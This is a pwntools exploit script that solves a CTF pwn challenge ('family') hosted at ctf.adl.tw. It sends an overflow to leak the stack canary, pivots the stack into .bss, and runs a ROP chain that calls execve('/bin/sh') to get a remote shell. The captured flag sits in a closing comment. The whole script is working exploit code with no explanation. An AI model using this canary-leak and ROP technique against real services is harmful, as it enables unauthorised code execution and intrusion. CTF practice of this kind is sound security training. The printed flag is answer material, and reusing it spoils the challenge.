from pwn import *

# p = process('./family')
p = remote('ctf.adl.tw', 11006)

p.sendafter('QQ', 'a'*0x19)
p.recvuntil('a'*0x18)
canary = u64(p.recv(8)) - ord('a')
success('canary = 0x%x', canary)

bss = 0x006bd000 - 0x500
pop_rsi = 0x0000000000410713
pop_rdx = 0x000000000044a365
read_again = 0x400C80
payload = b'a'*0x18 + p64(canary) + p64(bss+8) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x1000) + p64(read_again)
p.sendafter('?', payload)

pop_rdi = 0x0000000000400696
pop_rax = 0x000000000044a30c
syscall = 0x000000000040132c
payload = p64(canary) + b'/bin/sh\x00' + p64(pop_rdi) + p64(bss+8) + p64(pop_rsi) + p64(0) + p64(pop_rdx) + p64(0) + p64(pop_rax) + p64(0x3b) + p64(syscall)
p.send(payload)

p.interactive()

'''
ADLCTF{W3_d0_Lo0k_$1mIl4R,_D0n7_wE?}
'''